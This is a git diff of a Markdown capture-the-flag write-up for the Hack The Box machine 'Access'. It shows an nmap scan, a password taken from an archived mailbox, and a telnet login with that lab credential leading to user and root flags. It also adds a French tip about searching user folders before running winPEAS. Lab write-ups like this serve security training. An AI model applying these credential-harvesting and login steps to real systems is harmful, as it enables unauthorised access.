@@ -1,6 +1,6 @@
 ---
 title: HTB | Access
-description: 
+description: Access is an easy difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.
 slug: access-htb
 date: 2025-02-18 00:00:00+0000
 #image: cover.png
@@ -52,13 +52,6 @@ security : 4Cc3ssC0ntr0ller
 ```bash
 ┌──(kali㉿kali)-[~/htb/Access]
 └─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.98
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 08:37 EST
-NSE: Loaded 156 scripts for scanning.
-NSE: Script Pre-scanning.
-...
-Host is up, received echo-reply ttl 127 (0.018s latency).
-Scanned at 2025-02-16 08:37:32 EST for 129s
-Not shown: 65532 filtered tcp ports (no-response)
 PORT   STATE SERVICE REASON          VERSION
 21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -79,54 +72,6 @@ PORT   STATE SERVICE REASON          VERSION
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 |_http-title: MegaCorp
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: specialized|general purpose|phone
-Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%)
-OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
-OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
-Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 (88%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (88%), Microsoft Windows 7 (88%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (88%)
-No exact OS matches for host (test conditions non-ideal).
-TCP/IP fingerprint:
-SCAN(V=7.94SVN%E=4%D=2/16%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=67B1EA9D%P=x86_64-pc-linux-gnu)
-SEQ(SP=108%GCD=1%ISR=10B%II=I%TS=7)
-OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)
-WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
-ECN(R=Y%DF=Y%TG=80%W=2000%O=M53CNW8NNS%CC=N%Q=)
-T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
-T2(R=N)
-T3(R=N)
-T4(R=N)
-U1(R=N)
-IE(R=Y%DFI=N%TG=80%CD=Z)
-
-Uptime guess: 1.983 days (since Fri Feb 14 09:03:44 2025)
-Network Distance: 2 hops
-TCP Sequence Prediction: Difficulty=264 (Good luck!)
-IP ID Sequence Generation: Busy server or unknown class
-Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
-
-Host script results:
-|_clock-skew: 2s
-
-TRACEROUTE (using port 21/tcp)
-HOP RTT      ADDRESS
-1   17.82 ms 10.10.14.1
-2   17.85 ms 10.10.10.98
-
-NSE: Script Post-scanning.
-NSE: Starting runlevel 1 (of 3) scan.
-Initiating NSE at 08:39
-Completed NSE at 08:39, 0.00s elapsed
-NSE: Starting runlevel 2 (of 3) scan.
-Initiating NSE at 08:39
-Completed NSE at 08:39, 0.00s elapsed
-NSE: Starting runlevel 3 (of 3) scan.
-Initiating NSE at 08:39
-Completed NSE at 08:39, 0.00s elapsed
-Read data files from: /usr/share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 129.35 seconds
-           Raw packets sent: 131222 (5.777MB) | Rcvd: 2312 (581.687KB)
 ```
 
 ## Foothold
@@ -234,6 +179,7 @@ Processing Folder "Deleted Items"
 ```
 
 ### Getting "security" account password from emails
+security: `4Cc3ssC0ntr0ller`
 ```bash
 ┌──(kali㉿kali)-[~/htb/Access/Access Control]
 └─$ cat mbox | grep pass
@@ -241,10 +187,7 @@ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller
 </o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
 ```
 
-#### Credentials:
-security: `4Cc3ssC0ntr0ller`
-
-### TELNET - security account | user flag
+### TELNET - security account
 ```bash
 ┌──(kali㉿kali)-[~/htb/Access/Access Control]
 └─$ telnet 10.10.10.98 23
@@ -259,29 +202,6 @@ password: 4Cc3ssC0ntr0ller
 *===============================================================
 Microsoft Telnet Server.
 *===============================================================
-C:\Users\security>dir
- Volume in drive C has no label.
- Volume Serial Number is 8164-DB5F
-
- Directory of C:\Users\security
-
-08/23/2018  10:52 PM    <DIR>          .
-08/23/2018  10:52 PM    <DIR>          ..
-08/24/2018  07:37 PM    <DIR>          .yawcam
-08/21/2018  10:35 PM    <DIR>          Contacts
-08/28/2018  06:51 AM    <DIR>          Desktop
-08/21/2018  10:35 PM    <DIR>          Documents
-08/21/2018  10:35 PM    <DIR>          Downloads
-08/21/2018  10:35 PM    <DIR>          Favorites
-08/21/2018  10:35 PM    <DIR>          Links
-08/21/2018  10:35 PM    <DIR>          Music
-08/21/2018  10:35 PM    <DIR>          Pictures
-08/21/2018  10:35 PM    <DIR>          Saved Games
-08/21/2018  10:35 PM    <DIR>          Searches
-08/24/2018  07:39 PM    <DIR>          Videos
-               0 File(s)              0 bytes
-              14 Dir(s)   3,347,705,856 bytes free
-
 C:\Users\security>type Desktop\user.txt
 9535.....3f75
 ```
@@ -377,3 +297,6 @@ Mode                LastWriteTime     Length Name
 PS C:\Users\Administrator\Desktop> cat root.txt
 339f.....e901
 ```
+
+## Tips
+- Toujours fouiller les dossiers des utilisateurs accessibles, avant d'effectuer un **winPEAS**.
